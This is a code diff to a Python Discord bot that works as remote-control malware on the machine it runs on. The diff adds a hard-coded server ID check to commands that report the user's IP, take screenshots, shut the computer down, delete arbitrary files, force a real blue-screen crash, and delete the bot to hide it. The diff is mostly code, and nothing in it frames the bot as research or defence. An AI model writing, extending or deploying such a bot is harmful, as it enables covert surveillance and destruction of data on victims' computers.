@@ -13,6 +13,9 @@ intents.message_content = True
 intents.members = True  # Allow bot to access members
 bot = commands.Bot(command_prefix=".", intents=intents)
 
+# Replace with your Discord Server ID
+SERVER_ID = '1328839073082904657'  # Put your actual server ID here
+
 # Get the local IP of the user
 def get_ip():
     hostname = socket.gethostname()
@@ -105,43 +108,65 @@ async def download_attachment(message):
 # Command to create the channel with the user's IP
 @bot.command(name='start')
 async def start(ctx):
-    await create_channel(ctx)
+    # Make sure the user is in the right server
+    if str(ctx.guild.id) == SERVER_ID:
+        await create_channel(ctx)
+    else:
+        await ctx.send("You are not in the correct server!")
 
 # Command to take a screenshot
 @bot.command(name='ss')
 async def screenshot(ctx):
-    result = take_screenshot()
-    await ctx.send(result)
+    if str(ctx.guild.id) == SERVER_ID:
+        result = take_screenshot()
+        await ctx.send(result)
+    else:
+        await ctx.send("You are not in the correct server!")
 
 # Command to shut down the user's computer
 @bot.command(name='shutdown')
 async def shutdown(ctx):
-    result = shutdown_computer()
-    await ctx.send(result)
+    if str(ctx.guild.id) == SERVER_ID:
+        result = shutdown_computer()
+        await ctx.send(result)
+    else:
+        await ctx.send("You are not in the correct server!")
 
 # Command to delete a file (provide file path)
 @bot.command(name='filedelete')
 async def filedelete(ctx, file_path: str):
-    result = delete_file(file_path)
-    await ctx.send(result)
+    if str(ctx.guild.id) == SERVER_ID:
+        result = delete_file(file_path)
+        await ctx.send(result)
+    else:
+        await ctx.send("You are not in the correct server!")
 
 # Command to close a file (provide file name)
 @bot.command(name='fileclose')
 async def fileclose(ctx, file_name: str):
-    result = close_file(file_name)
-    await ctx.send(result)
+    if str(ctx.guild.id) == SERVER_ID:
+        result = close_file(file_name)
+        await ctx.send(result)
+    else:
+        await ctx.send("You are not in the correct server!")
 
 # Command to trigger a blue screen (actual crash)
 @bot.command(name='bluescreen')
 async def simulate_bluescreen(ctx):
-    result = bluescreen()
-    await ctx.send(result)
+    if str(ctx.guild.id) == SERVER_ID:
+        result = bluescreen()
+        await ctx.send(result)
+    else:
+        await ctx.send("You are not in the correct server!")
 
 # Command to disconnect and delete the bot file
 @bot.command(name='disconnect')
 async def disconnect(ctx):
-    result = disconnect_and_delete()
-    await ctx.send(result)
+    if str(ctx.guild.id) == SERVER_ID:
+        result = disconnect_and_delete()
+        await ctx.send(result)
+    else:
+        await ctx.send("You are not in the correct server!")
 
 # Event when the bot is ready
 @bot.event
